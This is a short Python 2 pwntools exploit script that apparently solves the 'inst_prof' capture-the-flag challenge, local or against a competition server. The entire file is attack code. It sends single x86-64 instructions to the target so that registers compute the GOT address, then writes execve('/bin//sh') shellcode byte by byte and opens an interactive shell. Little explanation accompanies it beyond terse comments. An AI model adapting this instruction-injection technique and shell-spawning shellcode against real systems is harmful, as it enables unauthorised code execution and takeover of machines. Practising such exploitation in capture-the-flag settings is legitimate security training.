#!/usr/bin/env python2

from pwn import *
from IPython import embed

context(arch='amd64', os='linux')
#context.log_level = 'debug'

ret = asm('ret')                            # "\xc3"

def writeByteString(str):
    mov_r15 = "\x41\xc6\x07"
    inc_r15 = asm('inc r15') + ret          # "\x49\xff\xc7"
    
    for byte in str:
        p.send(mov_r15 + byte)              # mov byte ptr [r15], {byte}
        p.send(inc_r15)                     # inc r15    

p = process("./inst_prof")
# p = remote("inst-prof.ctfcompetition.com", 1337)

print(p.readline())

shellcode = (
    "\xb0\x3b\x99\x48\xbb\x2f"
    "\x62\x69\x6e\x2f\x2f\x73"
    "\x68\x52\x53\x54\x5f\x52"
    "\x57\x54\x5e\x0f\x05"
)

# We store the return address r13
p.send(asm('mov r13, [rsp]'))               # "\x4c\x8b\x2c\x24"

# We need to get 0x2014e8 and add it to r13
p.send(asm('add r15, 0x20'))                # "\x49\x83\xc7\x20" -> r15 = 0x20 * 0x1000 -> 0x20000

inst = asm('add r14, r15') + ret
for i in range(0x10):
    p.send(inst)       # "\x4d\x01\xfe" + ret; r14 = 0x200000

inst = asm('add r14, r10') + ret            # "\x4d\x01\xd6" + ret
for i in range(0x9D):
    p.send(inst)                            # r14 = 0x2014da

inst = asm('inc r14') + ret                 # "\x49\xff\xc6" + ret
for i in range(0xE):
    p.send(inst)                            # r14 = 0x2014e8 !!
    
p.send(asm('add r13, r14') + ret)           # "\x4d\x01\xf5"; r13 = [rsp] + 0x2014e8 = GOT TABLE
p.send(asm('mov r14, r13') + ret)           # "\x4d\x89\xee"; r14 = r14; r14 Counter

inst = asm('inc r14') + ret                 # "\x49\xff\xc6"
for i in range(0x80):
    p.send(inst)

p.send(asm('mov r15, r14') + ret)           # "\x4d\x89\xf7"; r14 = r15 = 0x*******70

writeByteString(shellcode)
# r13 -> Addr GOT Table
# r14 -> Addr Shellcode
# r15 -> Addr End Shellcode

p.interactive()
